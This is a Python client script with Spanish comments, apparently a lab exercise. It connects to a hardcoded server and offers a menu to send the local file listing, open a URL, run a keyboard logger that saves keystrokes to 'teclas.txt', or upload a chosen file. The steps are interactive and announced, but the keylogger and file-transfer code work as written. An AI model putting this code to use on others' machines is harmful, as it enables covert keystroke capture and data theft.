#!/usr/bin/env python3
import socket
import os
import webbrowser
from pynput import keyboard

SERVER_IP = "172.17.44.232"
SERVER_PORT = 7777
BUFFER = 4096
KEYLOG_FILE = "teclas.txt"
def main():
    with socket.create_connection((SERVER_IP, SERVER_PORT), timeout=10) as s:
        # recibimos el menú desde el servidor
        menu = s.recv(BUFFER).decode(errors="ignore")
        print("Menú recibido del servidor:\n")
        print(menu)

        choice = input("Elige opción: ").strip().lower()
        if choice == "q":
            print("Saliendo.")
            return

        # Enviamos la elección al servidor para mantener sincronía
        s.sendall((choice + "\n").encode())

        if choice == "a":
            # enviar lista de archivos local (igual que antes)
            try:
                files = os.listdir('.')
                file_list_str = "\n".join(files) or "(vacío)"
            except Exception as e:
                file_list_str = f"ERROR al listar: {e}"
            payload = "CLIENT_LIST\n" + file_list_str + "\n<<END_OF_LIST>>\n"
            s.sendall(payload.encode('utf-8'))

            # leer respuesta del servidor
            resp = b""
            while True:
                chunk = s.recv(BUFFER)
                if not chunk:
                    break
                resp += chunk
            print("Respuesta del servidor:\n", resp.decode(errors="ignore"))

        elif choice == "b":
            # Pedir URL y abrir navegador localmente
            url = input("Introduce la URL a abrir (ej. https://www.example.com): ").strip()
            if not url:
                print("URL vacía. Cancelando.")
                s.sendall(b"CLIENT_OPENED\nERROR: URL vacia\n")
                return

            try:
                opened = webbrowser.open(url, new=0, autoraise=True)
                # webbrowser.open devuelve True/False en algunos sistemas; no es 100% fiable
                if opened:
                    msg = f"CLIENT_OPENED\nOK: abierto {url}\n"
                else:
                    msg = f"CLIENT_OPENED\nWARN: intento de abrir {url}, pero webbrowser.open devolvió False\n"
            except Exception as e:
                msg = f"CLIENT_OPENED\nERROR: {e}\n"

            # Enviamos confirmación/resultado al servidor
            s.sendall(msg.encode('utf-8'))

            # Leemos la respuesta final del servidor (si la hay)
            resp = b""
            while True:
                chunk = s.recv(BUFFER)
                if not chunk:
                    break
                resp += chunk
            if resp:
                print("Respuesta del servidor:\n", resp.decode(errors="ignore"))
            else:
                print("Notificación enviada al servidor.")

        elif choice == "c":
            print(f"Keylogger activo. Las teclas se guardarán en {KEYLOG_FILE}. Presiona ESC para detener.")

            def on_press(key):
                try:
                    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                        f.write(key.char)  # letra normal
                except AttributeError:
                    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                        f.write(f"[{key}]")  # tecla especial

            def on_release(key):
                if key == keyboard.Key.esc:
                    return False  # detiene el listener

            # Listener del teclado
            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()

            # Avisamos al servidor que el keylogger terminó
            msg = f"CLIENT_KEYLOG\nArchivo guardado en {KEYLOG_FILE}\n"
            s.sendall(msg.encode("utf-8"))


        elif choice == "d":
            # ejemplo de subida simple (compatibilidad con tu esquema previo)
            local = input("Ruta local del archivo a enviar: ").strip()
            if not os.path.exists(local):
                print("Archivo local no encontrado.")
                return
            remote = input("Ruta destino en la máquina remota: ").strip()
            filesize = os.path.getsize(local)
            # enviamos comando con tamaño y luego los bytes
            s.sendall(f"subirarchivo {remote} {filesize}\n".encode('utf-8'))
            ready = s.recv(BUFFER).decode('utf-8')
            if not ready.startswith("READY"):
                print("Servidor respondió:", ready)
                return
            with open(local, "rb") as f:
                while True:
                    chunk = f.read(BUFFER)
                    if not chunk:
                        break
                    s.sendall(chunk)
            # recibimos respuesta final
            resp = b""
            while True:
                chunk = s.recv(BUFFER)
                if not chunk:
                    break
                resp += chunk
            print("Respuesta del servidor:\n", resp.decode(errors="ignore"))

        else:
            # Para otras opciones, simplemente imprimimos respuesta del servidor
            resp = b""
            while True:
                chunk = s.recv(BUFFER)
                if not chunk:
                    break
                resp += chunk
            if resp:
                print("Respuesta del servidor:\n", resp.decode(errors="ignore"))
            else:
                print("No hay respuesta del servidor o se cerró la conexión.")

if __name__ == "__main__":
    main()
